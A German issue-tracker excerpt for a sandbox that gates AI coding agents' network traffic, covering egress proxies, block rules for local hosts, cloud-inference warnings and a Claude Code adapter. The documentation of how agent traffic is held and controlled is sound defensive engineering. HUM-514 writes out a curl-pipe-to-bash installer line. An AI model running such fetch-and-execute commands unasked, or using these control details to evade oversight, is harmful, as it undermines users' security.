## HUM-510 · App: eine Auffrischung desselben Backend-Mitglieds zeigt die Liste als ausstehend

### Kontext
Rest aus HUM-504. Wechselt das Projekt oder die Konfiguration, frischt
Riverpod dasselbe Mitglied von `sandboxBackendsProvider` auf und hält dabei
den alten Wert; der Abschnitt zeigt die alte Liste dann als aktuell. Ein
einfaches `isLoading` ginge nicht, weil das Nachfragen aus HUM-502 alle 2 s
auffrischt.

### Spezifikation
1. Eine Auffrischung, deren Plan sich geändert hat, zeigt die Liste
   gedämpft und die Segmente gesperrt wie in HUM-504; das Nachfragen eines
   noch geprüften Backends nicht.
2. Die Farbe der Gründe während des Ladens ist eigens getestet.

### Akzeptanzkriterien
1. Kein Flackern beim Nachfragen, keine alte Liste als aktuell nach einem
   Wechsel des Projekts.

### Stand nach der Umsetzung (2026-11-19)
Riverpod unterscheidet die beiden Auffrischungen schon: Ändert sich eine
Abhängigkeit (`configProvider`, `linkLiveProvider`), baut es das Mitglied als
Neuladen (`isReloading`), nach `invalidateSelf` des Nachfragens aus HUM-502 als
Auffrischen (`isRefreshing`). Neu `sandboxBackendsOutdated` in
`sandbox_backends_feed.dart`: wahr, solange ein Mitglied nach einer Änderung
der Konfiguration oder der Verbindung neu lädt. Welche Einstellungen der Plan
liest, beurteilt die App nicht (ADR-018); jede Änderung der Konfiguration
zählt. `SandboxBackendSection` zeigt die Liste dann gedämpft und sperrt die
Segmente wie in HUM-504; ebenso die Zeile `sandbox.backend` der Einstellungen,
deren Mitglied (`null`) nach jeder Änderung der Konfiguration neu lädt, auch
nach dem Schreiben von `sandbox.backend` selbst. Das Nachfragen eines Backends
in Prüfung dämpft nichts.

**Tests.** sandbox: erneutes Fragen nach einem Backend in Prüfung mit
zurückgehaltener Antwort (Wahl bedienbar, Zeilen in `fg1`), Wechsel des
Projekts über `SetConfig` auf `sandbox.work_dir` mit zurückgehaltener Antwort
(Wahl gesperrt, Zeilen und Untergrenze in `fg2`, Höhe gleich, danach die neue
Liste), Farbe der Gründe während des Ladens (Grund des Daemons und Satz ohne
Grund in `fg2`, davor und danach in `warningText`); settings: beides in der
Zeile. Je unter Linux und macOS. Mutationsbeweise: `sandboxBackendsOutdated`
als `isLoading` macht die Tests des Nachfragens rot, als `false` die des
Wechsels und der Farbe, `warningColor` ohne `pending` den der Farbe. Keine
Goldens geändert: Die Darstellung des Ladens ist die aus HUM-504.

**Nach dem Review.** Codex: Scheitert das Neuladen nach einem Wechsel des
Projekts, hält Riverpod die alte Liste neben dem Fehler, das Neuladen ist
vorbei, und die Zeile der Einstellungen zeigte die Liste des vorigen
Projekts in voller Farbe und wählbar. Die Zeile prüft jetzt den Fehler vor
dem Wert und nennt ihn wie bisher ohne Liste; der Abschnitt tat das schon
(HUM-504). Tests: gescheitertes Neuladen nach dem Wechsel in Zeile und
Abschnitt; je rot ohne die Prüfung von `hasError`. Sonnet: Wer ein Backend
mit der Tastatur wählt, schreibt `sandbox.backend`, das Neuladen sperrt die
Segmente, und ein gesperrtes Segment verliert den Fokus. Die Zeile merkt
sich beim Sperren, ob die Segmente den Fokus hatten, und gibt ihn danach
dem gewählten zurück; wer nicht in der Zeile war, bekommt dort keinen.
Tests: Wahl mit Enter, Fokus nach dem Neuladen wieder in der Zeile (rot ohne
das Merken), Wechsel des Projekts ohne Fokus in der Zeile lässt ihn draußen
(rot, wenn immer zurückgegeben wird).

Offen als Kandidat: Im Abschnitt des Reiters Isolation verliert eine Wahl
mit der Tastatur den Fokus ebenso, dort seit HUM-504 (neues Mitglied ohne
Wert, Segmente gesperrt).

---

## HUM-511 · Egress: der Adapter `HttpProxy` zu einem Entscheidungs-Proxy des Nutzers

### Kontext
ADR-0022 (Idee des Owners, BACKLOG Abschnitt 9, Punkt 22). ADR-0017 nennt
`HttpProxy(Url)` als zweiten Adapter des Egress-Ports; jetzt gibt es den
Nutzer dafür.

### Spezifikation
0. Ohne `egress.proxy` ändert sich nichts: Humanitl ist der einzige Proxy,
   ADR-0006 gilt ganz. Der zweite Proxy gibt es nur nach ausdrücklichem
   Opt-in.
1. Schlüssel `egress.proxy` (`http://HOST:PORT`), `egress.proxy_ca` (absoluter
   PEM-Pfad), `egress.proxy_auth_ref` (Verweis wie `llm.api_key_ref`),
   `egress.proxy_resolve` (`proxy`, Vorgabe, oder `humanitl`),
   `egress.proxy_response_timeout_secs` (Vorgabe wie `hold.timeout_secs`);
   alle `x-project-scope = denied`, mit Schema, `docs/CONFIG.md` und
   Schnappschüssen.
2. Adapter unter `daemon/crates/proxy/src/egress/`. Mit `proxy_resolve =
   "proxy"`: keine Auflösung in Humanitl, `CONNECT host:port`, `http` in
   absoluter Form mit dem Namen; vorher Sperre für private IP-Literale und
   lokale Namen (`localhost`, `*.localhost`, `*.local`, `*.internal`,
   Metadaten-Namen). Mit `"humanitl"`: `CONNECT IP:PORT` mit der Adresse,
   die der Handler nach der Entscheidung aufgelöst und geprüft hat, `http`
   mit der angehefteten Adresse und dem Namen in `Host`. Danach TLS mit
   `SNI = host` gegen die CA aus `egress.proxy_ca` (nur auf diesem Weg, nie
   direkt). Dafür sagt der Port dem
   Sender, welche Form er schreibt (Vertrag von `Egress` und
   `Upstream::send`, nicht nur ein neuer Adapter). Die CA steckt in einer
   eigenen `ClientConfig` für diesen Weg. Die Prüfung auf private Adressen
   gilt dem Ziel, nicht `egress.proxy`.
5. Fristen getrennt: `CONNECT` und TLS-Handschlag wie heute, nur der Kopf
   der Antwort wartet bis `egress.proxy_response_timeout_secs`, auch nach
   einem gestreamten Upload.
6. `egress.proxy` gilt für den Verkehr des Agenten (Handler, LLM-Alias);
   Anfragen des Daemons selbst (LLM-Suche, Update-Prüfung) bleiben direkt.
3. Jeder Fehler ein `Diagnostic` mit `why` und `fix` (Proxy nicht
   erreichbar, `407` auf `CONNECT` und auf eine `http`-Anfrage, Antwort auf
   `CONNECT` nicht `200`, Zertifikat passt nicht zur CA); `forward_to` reicht
   das Diagnostic bis zur Oberfläche durch, statt es auf
   `UpstreamError::Connect` zu verkürzen.
4. `humanitl doctor` und die Zeile im Isolationsbereich: „Egress: über
   HOST:PORT".
7. Global und sitzungsübergreifend einstellbar, in App und CLI gleich (ADR-018):
   - App, Einstellungen, eigener Abschnitt „Entscheidungs-Proxy": Adresse,
     CA-Datei mit Dateiauswahl (Hinweis auf
     `~/.mitmproxy/mitmproxy-ca-cert.pem`), wer auflöst, Zugangsdaten über
     den Schlüsselbund wie bei den Modellservern; Texte über ARB.
   - RPC „Verbindung prüfen": baut über `egress.proxy` einen Tunnel zu einem
     festen Ziel auf und meldet Erfolg oder ein `Diagnostic`; in der App ein
     Knopf, in der CLI `humanitl egress check`.
   - `humanitl config set egress.*` wie jeder Schlüssel.

### Tests
- Test mit einem Stellvertreter-Proxy im Test (CONNECT, eigene CA): mit
  `"proxy"` kommt der Name in der CONNECT-Zeile an und Humanitl stellt keine
  DNS-Anfrage; mit `"humanitl"` die Adresse in der CONNECT-Zeile und der
  Name in SNI.
- Ein privates IP-Literal und `localhost` werden in beiden Fällen
  abgelehnt, bevor der Proxy etwas sieht; ein Name mit privater Antwort mit
  `"humanitl"` ebenso.
- Ohne `egress.proxy` ist das Verhalten unverändert (bestehende Tests
  grün).
- Die CA des Proxys gilt nicht für eine direkte Verbindung.
- `http` über den Proxy: Anfragezeile in absoluter Form mit der Adresse,
  `Host` mit dem Namen.
- Eine Antwort, die erst nach 60 s kommt, erreicht den Agenten.
- Mutationen: Name statt Adresse in der CONNECT-Zeile, CA auf allen Wegen,
  Fristen vertauscht.

### Akzeptanzkriterien
1. Mit `egress.proxy` verlässt jede erlaubte Anfrage den Daemon über diesen
   Proxy; ohne ändert sich nichts.
2. Ohne Opt-in gilt ADR-0006 unverändert; mit `"humanitl"` kein Ziel, das
   Humanitl nicht selbst aufgelöst und geprüft hat; mit `"proxy"` keine
   DNS-Anfrage aus Humanitl.

### Status
Erledigt. Der Egress-Port liefert mit `open(Target)` eine `Route` (Strom,
Form der Anfrage, eigene `ClientTls`, Frist für den Antwortkopf); der neue
Adapter `egress/http_proxy.rs` spricht `CONNECT host:port` (Vorgabe
`egress.proxy_resolve = "proxy"`, keine DNS-Anfrage aus Humanitl) oder
`CONNECT IP:PORT` nach eigener Auflösung und Prüfung (`"humanitl"`), `http`
in absoluter Form, `Host` immer der Name. Lokale Namen (`localhost`,
`*.localhost`, `*.local`, `*.internal`, `*.home.arpa`, Namen ohne Punkt) und
private IP-Literale fallen in beiden Modi vor jeder Auflösung, außer
`allow_private` erlaubt sie. Die CA aus `egress.proxy_ca` gilt nur auf
diesem Weg; ein kaputter Proxy-Weg scheitert mit `PROXY_017`, nie direkt.
Fristen getrennt: Verbindung und `CONNECT` unter
`limits.connect_timeout_secs`, TLS unter dem Handschlag-Limit, nur der
Antwortkopf unter `egress.proxy_response_timeout_secs` (Vorgabe 300, auch
nach gestreamtem Upload). Befunde `PROXY_012` bis `PROXY_019` mit `why` und
`fix` am Fluss; ein Passwort in `egress.proxy` steht in keinem Befund.
Zugangsdaten über `egress.proxy_auth_ref` (Schlüsselbund oder
`0600`-Rückfalldatei), gesetzt nur über den RPC `Egress` bzw. `humanitl
egress auth set` von stdin. CLI `humanitl egress status|check|auth`, Zeile
`egress` in `doctor`, im Isolationsreiter „Egress: über HOST:PORT", in der
App der Abschnitt „Entscheidungs-Proxy" mit Dateiauswahl, Auflösung,
Zugangsdaten und „Verbindung prüfen"; die Einstellungen wirken nach einem
Neustart des Daemons, App und CLI sagen das. Protokoll 1.41.
`docs/SECURITY.md` und `docs/THREAT-MODEL.md` (K-35) nennen den Opt-in und
seine Grenzen schon hier, weil er die Aussage schwächt (CLAUDE.md).

Review: Codex Runde 1 ein blocking (lokale Namen bei `"humanitl"` nicht
vorab geprüft) und ein major (Befunde nach dem `CONNECT` ohne Diagnostic),
beide behoben; Delta ein major (Passwort aus `egress.proxy` im Befund) und
ein minor (doppelter Fristhinweis nach gestreamtem Upload), beide behoben.
Sonnet als Ersatz für Antigravity kein blocking oder major; neun minor
übernommen (Neustart-Hinweis sofort, Module `egress/screen.rs`,
`diagnostics.rs`, `check.rs` statt Rückabhängigkeit, `OpenError` statt
Codevergleich, `HttpProxy::connect` gesperrt, Test für gestreamten Upload,
gemeinsame Vorgabe, Doku zum Datei-Rückfall, Passwörter mit Leerzeichen).
Offen: Ein Daemon vor 1.41 zeigt die Kategorie leer; der Dart-Fake-Doctor
hat keine Zeile `egress`; Burp ist nicht erprobt (HUM-513).

---

## HUM-512 · `hold.ask_mode = "upstream"`: Anfragen ohne Regel entscheidet der Proxy dahinter

### Kontext
ADR-0022, Punkt 3 und 4.

### Spezifikation
1. Neuer Wert `upstream` für `hold.ask_mode`, nur gültig mit `egress.proxy`
   (sonst ein Diagnostic beim Laden, der Start verweigert).
2. Eine Anfrage ohne Regel oder mit `ask` wird nicht gehalten, sondern
   weitergeleitet; neue Entscheidungsquelle `upstream` und der Übergang
   `Analyzed` zu `Decided(Forward)` in der Zustandsmaschine, vollständig im
   Übergangstest aufgezählt. `block` bleibt endgültig, `allow` geht ebenfalls
   über den Proxy, `redact` hält weiter in Humanitl.
2a. Die letzte Sperre vor dem Senden gilt auch für `Forward`: mit
   `hold.hard_block_checksum_secrets` sperrt das System eine Anfrage mit
   prüfsummen-sicherem Geheimnis, sie erreicht den Proxy nie.
3. Audit und Aufzeichnung tragen die Quelle `upstream` und den Status der
   Antwort; sie behaupten keine Entscheidung, die Humanitl nicht gesehen
   hat.
4. App und CLI zeigen den Modus (Moduszeile jeder Sitzung, „Ohne Regel:
   entscheidet HOST:PORT", `humanitl sessions`), über RPC (ADR-018); neue
   Texte über ARB. In den Einstellungen ist „Entscheidet der Proxy dahinter"
   die vierte Wahl beim Fragemodus, nur wählbar mit eingetragenem Proxy. Die Moduszeile sagt, wer auflöst und was
   daraus folgt.
5. Im selben Commit `docs/SECURITY.md` und `docs/THREAT-MODEL.md` (en und
   de) und, wo nötig, die Sicherheitsaussage in `README.md`: Der Proxy
   dahinter sieht den entschlüsselten Verkehr (auch LLM-Passthrough); die
   Vertrauensgrenze für Inhalte wandert zu ihm, die Isolierung nicht; mit
   `proxy_resolve = "proxy"` prüft er, ob ein Name auf eine private Adresse
   zeigt, mit `"humanitl"` geht die DNS-Anfrage vor seiner Entscheidung
   hinaus (ADR-0006 gilt im Opt-in nur zur Hälfte).

### Tests
- Ohne `egress.proxy` lehnt der Start `upstream` ab.
- Ein Block-Treffer erreicht den Proxy nie; eine Anfrage ohne Regel kommt
  ohne Halt beim Proxy an; die Antwort des Proxys (auch `403`) erreicht den
  Agenten und steht im Audit.
- Eine Anfrage mit prüfsummen-sicherem Geheimnis erreicht den Proxy nicht.
- `redact` hält weiter.
- Mutationen: Block geht zum Proxy, Halt trotz `upstream`, Sperre für
  Geheimnisse ohne `Forward`.

### Akzeptanzkriterien
1. Nichts, was eine Regel sperrt, erreicht den Proxy dahinter.
2. Keine Anfrage ohne Regel oder mit `ask` wartet in Humanitl auf eine
   Person, wenn `upstream` gilt.
3. Sicherheitsaussage und Bedrohungsmodell nennen den Modus und seine
   Grenzen im selben Commit.

### Stand nach der Umsetzung (2026-11-16)

Neuer Wert `AskMode::Upstream`, nur gültig mit `egress.proxy`: Laden und
`SetConfig` lehnen ihn sonst mit `CONFIG_003` ab, der Sitzungsstart ebenso,
solange der laufende Daemon noch direkt hinausgeht (Neustart fehlt). Keine
neue `Decision`-Variante: `Decided(Forward)` ist `Allow` mit der Quelle
`DecisionSource::Upstream`, erreichbar nur aus `Analyzed` und nur
unbearbeitet. `block` bleibt endgültig, `redact` hält weiter in Humanitl
(`FlowPipeline::decide_here`), ein Prüfsummen-Geheimnis wird zur
Systemsperre `403`, bevor der Proxy ein Byte sieht. Audit `decision:
forward`, `decided_by: upstream`, Recorder-Migration V12 mit Spalte
`upstream`, `/why` antwortet `upstream` auch nach einem Neustart. Protokoll
1.42 (`DECISION_SOURCE_UPSTREAM`, `SandboxEvent.Status.ask_mode`). CLI-
Moduszeile in `humanitl sessions`, `sandbox plan` und `run`; `humanitl
flows` zeigt `forward`. App: vierte Wahl „Proxy dahinter" (ohne Proxy
gesperrt, mit Begründung), Moduszeile im Isolationsreiter, im Verlauf
„Weitergereicht, Proxy antwortete N" statt „Erlaubt". Briefing und SKILL
mit eigener Variante (Wartezeit bis zur längeren Frist, dann `502`, `403`
endgültig). SECURITY, THREAT-MODEL (K-35, auch die deutschen
Übersetzungen) und README nennen Modus und Grenzen.

Review: Codex ein blocking (die mitgelieferte Durchreiche zum Sprachmodell
steht vor Block-Regeln und erreicht so den Proxy) auf minor herabgestuft,
weil die Rangfolge in jedem Modus gilt und nicht aus diesem Issue stammt;
die Ausnahme steht jetzt in README, SECURITY und K-35, mit Test. Codex
minor „Erlaubt" im Verlauf übernommen; minor „Pause lässt `redact` zum
Proxy" verworfen, weil die Pause in jedem Modus alles Wartende sofort
hinauslässt, die Doku sagt es. Sonnet als Ersatz für Antigravity kein
blocking oder major; zwei minor übernommen (`redact`-Ausnahme in der
Moduszeile, eigener Text ohne aktiven Proxy). Offen: der lange Text
„Entscheidet der Proxy dahinter" steht nur im Screenreader-Label; ein
Hinweis im Isolationsreiter, wenn `upstream` eingestellt ist, der Daemon
aber noch direkt sendet, ist Kandidat für ein eigenes Issue.

---

## HUM-513 · Entscheidungs-Proxy: Anleitung für mitmproxy, Ende-zu-Ende-Test

### Kontext
ADR-0022, Abschnitt Folgen.

### Spezifikation
1. Anleitung `docs/guides/`: mitmproxy hinter Humanitl (CA exportieren,
   `egress.proxy`, `egress.proxy_ca`, `hold.ask_mode = "upstream"`, in
   mitmproxy abfangen und entscheiden).
2. Ende-zu-Ende-Test in der CI mit einem Stellvertreter-Proxy, der wie
   mitmproxy `CONNECT` zu einer Adresse annimmt und den Namen aus SNI nimmt.
3. ADR-0022 auf `Accepted`. Burp nur nennen, wenn ein aktueller Build
   ausprobiert wurde.

### Akzeptanzkriterien
1. Die Anleitung führt mit Belegen zu einem laufenden Aufbau mit mitmproxy.

### Stand nach der Umsetzung (2026-11-16)

Anleitung `docs/guides/decision-proxy-mitmproxy.md` mit deutscher
Übersetzung: zwei CAs, `egress.proxy`, `egress.proxy_ca`, beide Werte von
`egress.proxy_resolve`, `hold.ask_mode = "upstream"`, Schritte über CLI,
`config.toml` und App, was der Agent sieht, Grenzen aus SECURITY, Rückweg.
Jede Aussage zu mitmproxy mit Beleg aus docs.mitmproxy.org; mit mitmproxy
12.3.1 in einer Wegwerf-Umgebung real geprüft (nicht gegen einen echten
humanitld). Gemessen: Mit den Vorgaben (`connection_strategy=eager`)
verbindet sich mitmproxy schon im TLS-Handschlag mit dem Ziel, also vor der
Entscheidung; die Anleitung startet mitmproxy deshalb mit
`connection_strategy=lazy` und `upstream_cert=false` und sagt beides. Ein
Kill auf eine angehaltene Anfrage lässt die Verbindung in 12.3.1 offen, der
Agent sieht `502` erst nach der Frist; für sofortige Ablehnung empfiehlt
die Anleitung `block_list`. Ende-zu-Ende-Test
`daemon/crates/proxy/tests/decision_proxy_end_to_end.rs` (5 Tests) mit
einem Stellvertreter, der jedes `CONNECT` annimmt, das Blatt auf den
SNI-Namen ausstellt und je Anfrage entscheidet: `CONNECT IP` mit SNI,
`CONNECT host`, Ablehnung `403`, Kill `502`, Block-Regel erreicht ihn nie.
ADR-0022 auf Accepted, die überholte verworfene Alternative zur
Namensauflösung im zweiten Proxy richtiggestellt.

Review: Codex ein blocking (Anleitung versprach Auflösung erst nach der
Entscheidung, mitmproxy verbindet mit Vorgaben aber vorher), übernommen
und real nachgemessen. Sonnet als Ersatz für Antigravity keine Befunde.
Burp folgt als eigenes Issue mit einem Probelauf des Eigentümers.

---

## HUM-516 · Cloud-Agenten: gemeinsamer Hinweis auf den Abfluss über die Inferenz

### Kontext
Wunsch des Owners vom 2026-11-16: Claude Code und Codex sollen in Humanitl
laufen (HUM-514, HUM-515). Mit einem Cloud-Modell fließen über die Inferenz
auf jeden Fall Daten ab: Prompts, gelesene Dateien und Werkzeugausgaben gehen
als Teil der Anfragen an den Anbieter. Wer das weiß, soll trotzdem den
Vorteil einer schnellen, einfachen, sauberen Sandbox von Humanitl nutzen
können. Der Hinweis ist ein eigenes Issue, weil beide Adapter (und jeder
spätere, auch OpenCode und pi mit einem Cloud-Endpunkt) denselben brauchen.

### Spezifikation
1. Eine Eigenschaft des Adapters bzw. des Endpunkts: „Inferenz geht an
   einen Anbieter außerhalb dieses Rechners" (Cloud), abgeleitet aus dem
   Host des Modell-Endpunkts; ein Endpunkt auf `localhost`, im LAN oder in
   `llm.servers` als lokal markiert gilt nicht als Cloud.
2. Text, sachlich und ohne Angst zu machen (en Quelle, de Übersetzung, über
   ARB und als Diagnostic-Hinweis für die CLI): Was der Agent liest, geht
   als Teil seiner Anfragen an den Anbieter des Modells. Humanitl isoliert
   das System und hält jede andere Verbindung an; die Inferenz selbst ist
   bewusst freigegeben.
3. Wo er steht:
   - beim Wählen des Agenten oder Endpunkts in App und CLI (Einrichtung,
     Einstellungen, `humanitl config set agent.*`), einmal;
   - beim ersten Start mit dieser Kombination aus Agent und Anbieter, mit
     Bestätigung (App: Dialog; CLI: Frage im Terminal; mit `--yes` oder
     ohne Terminal genügt eine Zeile auf stderr); danach still;
   - dauerhaft als **orangefarbenes Tag oben in der Sitzung** (Kopfzeile
     der Sitzung in der App, neben Backend und Isolationsstufe), etwa
     „Cloud-Inferenz: Daten gehen an api.anthropic.com"; Farbe aus dem
     Warn-Token des Designsystems (Orange, nicht Rot: Rot bleibt Fehlern und
     Sperren vorbehalten); Tooltip bzw. Klick zeigt den ganzen Text aus
     Punkt 2. In der CLI dieselbe Aussage in der Statuszeile bzw. beim Start
     von `humanitl go` und `run` in Orange (ohne Farbe bei `NO_COLOR`);
   - als Zeile in `humanitl doctor`.
   Er blockiert nichts.
4. Die Bestätigung wird je Agent und Anbieter im Zustand des Daemons
   gespeichert, über RPC gelesen und gesetzt (ADR-018), nicht in der App.
5. `docs/SECURITY.md` und `docs/THREAT-MODEL.md` (en und de) nennen den
   Fall; die Sicherheitsaussage in `README.md` bleibt wahr, weil die
   Inferenz eine Freigabe ist, und sagt es, falls nötig, ausdrücklich.

### Tests
- Hinweis beim ersten Start, danach nicht mehr; nicht für einen lokalen
  Endpunkt; erneut für einen anderen Anbieter.
- CLI ohne Terminal: Zeile auf stderr, kein Warten.
- Widget-Test und Golden: das Tag steht oben in der Sitzung, in der
  Warnfarbe, mit dem Namen des Anbieters; ohne Cloud-Endpunkt kein Tag.
- Mutationen: Hinweis fehlt für Cloud, Hinweis für lokal.

### Akzeptanzkriterien
1. Niemand nutzt einen Cloud-Agenten in Humanitl, ohne den Hinweis gesehen
   zu haben; niemand wird durch ihn aufgehalten, der ihn bestätigt hat.

### Stand nach der Umsetzung (2026-11-17)

Urteil „Cloud" in `humanitl_config::inference::provider_outside` aus dem
Host des Modell-Endpunkts, ohne DNS (ADR-0006): lokal sind Loopback,
private Adressen, `localhost`, `.local`, `.lan`, `.home.arpa`, `.internal`
und ein Server mit `llm.servers.NAME.local = true` (nur für seine Origin).
Adapter-Hook `AgentAdapter::inference_endpoint` für HUM-514/515/517. Der
Daemon prüft beim Start auf der ganz aufgelösten Konfiguration samt
`cli_overrides`; einen unbestätigten ersten Start einer Kombination aus
Agent und Anbieter lehnt er mit `LLM_011` ab, außer der Start trägt
`CloudNoticeFor{agent, provider}` als Bestätigung (wird gemerkt) oder als
ohne Terminal gezeigten Hinweis (wird nicht gemerkt), und zwar für genau
den aufgelösten Anbieter. Neue Op `check_cloud_inference`, Protokoll 1.43.
Bestätigungen in `$XDG_DATA_HOME/humanitl/cloud-inference.toml`. CLI:
Frage `[y/N]` vor dem ersten Start, `--yes`, ohne Terminal eine Zeile auf
stderr, orange Startzeile (ohne Farbe bei `NO_COLOR`), Zeile in
`sessions`, `doctor`-Zeile `inference`, Hinweis bei `config set`,
`llm server use/add/edit`; `sandbox run` und ein Daemon vor 1.43 prüfen
lokal. App: orangefarbenes Tag oben in der Sitzung mit eigenem Token
`outflow` (dunkel `#FF9100`, hell `#B35400`, Kontrast und Abstand zu
Gelb, Rot und Orchid per Test), Popover mit vollem Text, Dialog vor dem
ersten Start auch aus der Einrichtung, Notiz bei Agent- und Modellwahl;
gegen einen Daemon vor 1.43 startet die App nicht und nennt den Neustart.
SECURITY (5.1), THREAT-MODEL (K-02), README (en und de) nennen die
Inferenz als gewollte Freigabe.

Review: Codex Runde 1 drei blocking (`run --llm`, Start aus der
Einrichtung, `sandbox run` ohne Hinweis) und ein minor (`llm server
use`), alle behoben durch das Tor im Daemon plus die drei Wege; Delta zwei
blocking (Antwort nicht an den gezeigten Anbieter gebunden, alter Daemon
ohne Tor), beide behoben. Sonnet als Ersatz für Antigravity kein blocking
oder major; zwei minor übernommen (Cloud-Dialog erst nach erfolgreicher
Server-Bestätigung, Tag kürzt lange Hosts), einer verworfen (CLI-Frage
englisch, wie alle CLI-Ausgaben). Owner-Entscheid: eigenes Orange-Token
statt Ocker. Offen: Ordner-Wahl bekommt bei sichtbarem Tag höchstens die
Hälfte des freien Platzes in der Kopfzeile; echte Schrift in den Goldens
nicht gesichtet.

---

## HUM-514 · Agent-Adapter Claude Code

### Kontext
Wunsch des Owners (BACKLOG Abschnitt 9, Punkte 8 und 9, Marktanalyse vom
2026-11-14). Claude Code soll in der Sandbox laufen wie OpenCode und pi, auch
mit `humanitl go`. Angaben unten geprüft am 2026-11-16 an der offiziellen
Dokumentation; vor dem Bau erneut prüfen, weil sie sich schnell ändert:
code.claude.com/docs/en/network-config, /settings, /env-vars.

### Spezifikation
1. Adapter nach HUM-037 wie `opencode.rs` und `pi.rs`: Erkennung des
   Programms (`claude`, nativer Installer oder npm), Profil, Standardregeln,
   Env-Kit, Briefing.
2. **Netz und CA** (Doku „Enterprise network configuration"):
   - `HTTPS_PROXY` auf den Proxy der Sandbox; Claude Code liest die
     Standard-Proxyvariablen und unterstützt kein SOCKS.
   - Die CA der Sandbox über `NODE_EXTRA_CA_CERTS`. Claude Code vertraut
     standardmäßig seinen gebündelten Mozilla-Wurzeln und dem Speicher des
     Systems (`CLAUDE_CODE_CERT_STORE`, Vorgabe `bundled,system`); die
     Variable fügt unsere CA hinzu. Test, dass die Warnung „ignored all of
     the NODE_EXTRA_CA_CERTS file" nicht erscheint.
   - `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` als Vorgabe: schaltet
     Auto-Updates, Telemetrie, Fehlerberichte und `/feedback` ab. Jeder
     Wert außer leer schaltet ab, auch `0`.
3. **Standardregeln:** `api.anthropic.com` erlaubt (Modell, auch die
   Domain-Prüfung von WebFetch, Feature-Flags). Alles andere läuft in den
   Halt wie bei jedem Agenten. Für die Anmeldung über claude.ai braucht
   es `claude.ai`, `platform.claude.com` und gegebenenfalls
   `sso.claude.com`; diese nicht freigeben, sondern beim ersten Mal halten,
   damit der Nutzer sieht, was passiert.
4. **Zugangsdaten**, nie als Argument, nie in einer Datei im Projekt:
   - API-Schlüssel aus dem Schlüsselbund wie `llm.servers`
     (`secret-service:humanitl/anthropic`), in die Sandbox als
     `ANTHROPIC_API_KEY` (Doku: Header `X-Api-Key`; im interaktiven Modus
     fragt Claude Code einmal, ob der Schlüssel das Abo ersetzt).
   - Ein Gateway oder eigener Endpunkt über `ANTHROPIC_BASE_URL` und
     `ANTHROPIC_AUTH_TOKEN` (Bearer), wenn `llm.endpoint` gesetzt ist.
   - Die Anmeldung des Hosts (`~/.claude`, `~/.claude.json`) wird nicht
     eingebunden. Der Agent bekommt ein eigenes `CLAUDE_CONFIG_DIR` in der
     Sandbox (je Wegwerf-Sitzung frisch, sonst persistent je Projekt unter
     `$XDG_DATA_HOME/humanitl`). Eine Anmeldung mit Abo geschieht dann in
     der Sandbox über den gehaltenen Login-Fluss; ein ausdrückliches
     Einbinden der Host-Anmeldung ist ein eigener Schalter mit Hinweis, nicht
     Teil dieses Issues.
5. Die eigene Sandbox von Claude Code bleibt, wie sie ist (sie schadet in
   unserer nicht); im Briefing steht, dass die äußere Grenze Humanitl ist.
6. Hinweis auf die Inferenz aus HUM-516.

### Agent-Depot (ADR-0023, Nachtrag 2026-11-16)
Mit `agents.claude.source = "depot"` kommt `claude` aus dem Depot
(HUM-518 bis HUM-520), nicht vom Host; Punkt 1 (Erkennung) gilt dann nicht.
Der Adapter liefert dafür seine Depot-Angaben: Installation über den
nativen Installer bzw. `downloads.claude.ai/claude-code-releases/<version>/`
mit Prüfung des signierten `manifest.json` (Fingerabdruck
`31DD DE24 DDFA B679 F42D 7BD2 BAA9 29FF 1A7E CACE`,
code.claude.com/docs/en/setup); `DISABLE_UPDATES=1` in der Sitzung;
`CLAUDE_CONFIG_DIR` auf die Kopie von `config/`; Zugangsdatei
`.credentials.json` mit Format und Anmelde-Hosts; Anmeldung mit
„Paste code here if prompted" (code.claude.com/docs/en/authentication);
Schlüssel, die Befehle ausführen (`hooks`, `apiKeyHelper`, `statusLine`,
`mcpServers`, `env`). Punkt 4, letzter Spiegelstrich („persistent je
Projekt"), entfällt bei `"depot"`: Zustand lebt dann in der Kopie der
Sitzung, die Anmeldung im Depot.

### Tests
- Adapter-Tests wie für OpenCode und pi (Env-Kit, Dateien, Argumente).
- Ende-zu-Ende-Lauf in der CI mit einem Stellvertreter-Endpunkt über
  `ANTHROPIC_BASE_URL` (keine echte Anmeldung, kein echter Schlüssel), wenn
  sich `claude` dafür im Runner installieren lässt; sonst ein Lauf mit einem
  Stellvertreter-Programm, das die Umgebung prüft.
- Nichts aus `~/.claude` des Hosts ist in der Sandbox sichtbar.
- Mutationen: Host-Anmeldung eingebunden, CA fehlt, Schlüssel als Argument.

### Akzeptanzkriterien
1. `humanitl go` mit Claude Code führt bis zu dessen Prompt in der
   Wegwerf-Sitzung, mit API-Schlüssel aus dem Schlüsselbund.
2. Die Anmeldedaten des Hosts erreichen die Sandbox nicht.

### Stand nach der Umsetzung (2026-11-20)

Gebaut: `daemon/crates/sandbox/src/agent/claude.rs` (`ClaudeCodeAdapter`,
dritter Eintrag im Register, `agent.adapter = "claude"`, auch in Katalog und
App). Jede Angabe stammt aus der Doku des Herstellers, gelesen 2026-11-20,
und steht mit Adresse im Code; nichts ist an einem echten `claude` gemessen.

- Erkennung wie `OpenCode`: ein natives Programm (setup, „Install with npm":
  das npm-Paket verlinkt dasselbe Binary, „does not itself invoke Node"),
  also auch aus `~/.local/bin` des nativen Installers gebunden (HUM-278).
  `AGENT_001` nennt den nativen Installer
  `curl -fsSL https://claude.ai/install.sh | bash`.
- Env-Kit: `CLAUDE_CONFIG_DIR=<home>/.claude` auf dem tmpfs-Home der Sitzung
  (jede Sitzung frisch), `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`,
  `DISABLE_UPDATES=1` (auch vom Host), `NODE_EXTRA_CA_CERTS` auf die CA der
  Sandbox (env-vars, network-config). `HTTPS_PROXY` kommt wie für jeden
  Agenten aus dem Env-Kit des Profils. Im Depot setzt das Rezept
  `CLAUDE_CONFIG_DIR` auf die Kopie der Sitzung, und dieser Wert gewinnt.
- Schlüssel: aus `llm.api_key_ref` wie bei jedem Adapter, als Datei aus einem
  memfd (`/etc/humanitl/claude/llm-api-key`). Claude Code liest ihn nur aus
  der Umgebung; neue Methode `AgentAdapter::launcher` stellt deshalb
  `/bin/sh -c <script> claude` vor das endgültige Kommando des Agenten (nicht
  vor eine Shell des Aufrufers), das die Datei mit dem eingebauten `read`
  liest, `ANTHROPIC_API_KEY` exportiert und den Agenten per `exec` startet.
  Der Schlüssel steht so in keinem `argv` und in keiner Variable des Plans
  (bwrap trägt `--setenv` in seiner eigenen Kommandozeile). Mit
